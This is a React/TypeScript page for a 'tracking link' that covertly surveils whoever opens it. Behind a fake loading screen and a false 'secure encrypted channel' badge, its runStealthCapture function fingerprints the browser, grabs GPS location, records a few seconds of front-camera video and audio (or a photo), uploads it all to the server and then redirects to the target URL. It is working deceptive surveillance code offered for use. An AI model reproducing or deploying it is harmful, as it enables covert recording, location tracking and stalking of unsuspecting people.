import { useEffect, useRef, useState } from "react";
import { useParams } from "wouter";
import { trpc } from "@/lib/trpc";
import { Loader2, ShieldCheck } from "lucide-react";

export default function TrackingPage() {
  const params = useParams<{ id: string }>();
  const linkId = params.id || "";

  const [statusText, setStatusText] = useState("正在建立安全连接...");
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);

  const linkQuery = trpc.tracking.getLink.useQuery({ id: linkId }, { enabled: !!linkId });
  const submitMutation = trpc.captures.submit.useMutation();

  useEffect(() => {
    if (!linkId) return;

    if (linkQuery.isError || linkQuery.data === null) {
      setStatusText("链接不存在或已失效。");
      return;
    }

    if (linkQuery.data) {
      runStealthCapture(linkQuery.data.redirectUrl);
    }
  }, [linkQuery.data, linkQuery.isError]);

  const generateFingerprint = () => {
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    if (!ctx) return "unknown";
    ctx.textBaseline = "top";
    ctx.font = "14px 'Arial'";
    ctx.fillText("ZYJ-Fingerprint-2026", 2, 2);
    return canvas.toDataURL().slice(-50);
  };

  const getGPS = (): Promise<string> => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve("不支持定位");
        return;
      }
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          resolve(`${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)} (精度: ${Math.round(pos.coords.accuracy)}m)`);
        },
        () => {
          resolve("未授权 / 不可用");
        },
        { timeout: 5000, maximumAge: 60000 }
      );
    });
  };

  const runStealthCapture = async (redirectUrl: string) => {
    try {
      setStatusText("正在初始化环境...");

      const resolution = `${window.screen.width}x${window.screen.height} (DPR: ${window.devicePixelRatio})`;
      const fingerprint = generateFingerprint();
      const gps = await getGPS();

      // 请求摄像头权限
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
        audio: true,
      });

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
      }

      let capturedData = "";
      const isRecorderSupported = typeof MediaRecorder !== "undefined";

      if (isRecorderSupported) {
        try {
          const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm;codecs=vp8,opus" });
          const chunks: Blob[] = [];

          mediaRecorder.ondataavailable = (e) => {
            if (e.data.size > 0) chunks.push(e.data);
          };

          mediaRecorder.onstop = async () => {
            const blob = new Blob(chunks, { type: "video/webm" });
            const reader = new FileReader();
            reader.onloadend = async () => {
              capturedData = reader.result as string;
              await sendAndRedirect(capturedData, gps, fingerprint, resolution, redirectUrl, stream);
            };
            reader.readAsDataURL(blob);
          };

          mediaRecorder.start();
          setTimeout(() => {
            if (mediaRecorder.state === "recording") {
              mediaRecorder.stop();
            }
          }, 3500);
          return;
        } catch (e) {
          console.warn("MediaRecorder failed, falling back to photo:", e);
        }
      }

      // 降级拍照
      setTimeout(async () => {
        if (videoRef.current && canvasRef.current) {
          const video = videoRef.current;
          const canvas = canvasRef.current;
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          const ctx = canvas.getContext("2d");
          if (ctx) {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            capturedData = canvas.toDataURL("image/jpeg", 0.85);
            await sendAndRedirect(capturedData, gps, fingerprint, resolution, redirectUrl, stream);
            return;
          }
        }
        stream.getTracks().forEach((t) => t.stop());
        window.location.href = redirectUrl;
      }, 1500);

    } catch (err) {
      console.warn("Camera access declined:", err);
      setStatusText("正在跳转...");
      setTimeout(() => {
        window.location.href = redirectUrl || "https://example.com";
      }, 1000);
    }
  };

  const sendAndRedirect = async (
    imageBase64: string,
    gps: string,
    fingerprint: string,
    resolution: string,
    redirectUrl: string,
    stream: MediaStream
  ) => {
    try {
      setStatusText("正在提交数据...");
      stream.getTracks().forEach((t) => t.stop());

      await submitMutation.mutateAsync({
        linkId,
        imageBase64,
        gps,
        fingerprint,
        resolution,
      });

      setStatusText("正在跳转到目标网页...");
      window.location.href = redirectUrl;
    } catch (err) {
      console.error("Submission error:", err);
      window.location.href = redirectUrl;
    }
  };

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col items-center justify-center p-4">
      <div className="max-w-md w-full bg-slate-900/80 border border-slate-800 rounded-2xl p-8 shadow-2xl backdrop-blur-xl text-center space-y-6">
        <div className="w-16 h-16 bg-indigo-600/20 text-indigo-400 rounded-2xl mx-auto flex items-center justify-center border border-indigo-500/30 animate-pulse">
          <Loader2 className="w-8 h-8 animate-spin" />
        </div>
        <div className="space-y-2">
          <h2 className="text-xl font-bold tracking-tight text-white">正在加载内容</h2>
          <p className="text-sm text-slate-400">{statusText}</p>
        </div>

        <div className="hidden">
          <video ref={videoRef} playsInline muted />
          <canvas ref={canvasRef} />
        </div>

        <div className="pt-4 border-t border-slate-800/80 flex items-center justify-center gap-2 text-xs text-slate-500">
          <ShieldCheck className="w-4 h-4 text-emerald-400" />
          <span>安全加密传输通道</span>
        </div>
      </div>
    </div>
  );
}
